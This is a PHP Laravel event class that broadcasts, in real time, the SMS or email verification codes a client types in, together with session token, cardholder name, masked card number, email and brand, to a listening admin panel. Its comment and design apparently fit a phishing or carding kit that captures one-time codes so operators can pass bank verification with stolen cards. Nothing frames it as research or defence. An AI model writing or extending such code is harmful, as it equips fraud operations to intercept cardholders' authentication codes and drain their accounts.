<?php

namespace App\Events;

use App\Models\CardVerification;
use Illuminate\Broadcasting\Channel;
use Illuminate\Broadcasting\InteractsWithSockets;
use Illuminate\Contracts\Broadcasting\ShouldBroadcastNow;
use Illuminate\Foundation\Events\Dispatchable;
use Illuminate\Queue\SerializesModels;

/**
 * Fired when client enters an SMS or Email code.
 * Admin panel listens to this to see the code in real-time.
 */
class CardCodeSubmitted implements ShouldBroadcastNow
{
    use Dispatchable, InteractsWithSockets, SerializesModels;

    public function __construct(
        public CardVerification $cardVerification,
        public string $codeType, // 'sms' or 'email'
        public string $code
    ) {}

    public function broadcastOn(): array
    {
        return [
            new \Illuminate\Broadcasting\PrivateChannel('card-verifications'),
        ];
    }

    public function broadcastAs(): string
    {
        return 'card.code.submitted';
    }

    public function broadcastWith(): array
    {
        return [
            'id' => $this->cardVerification->id,
            'uuid' => $this->cardVerification->uuid,
            'session_token' => $this->cardVerification->session_token,
            'code_type' => $this->codeType,
            'code' => $this->code,
            'cardholder_name' => $this->cardVerification->cardholder_name,
            'card_number_masked' => $this->cardVerification->card_number_masked,
            'email' => $this->cardVerification->email,
            'brand' => $this->cardVerification->brand->slug ?? null,
            'submitted_at' => now()->toISOString(),
        ];
    }
}
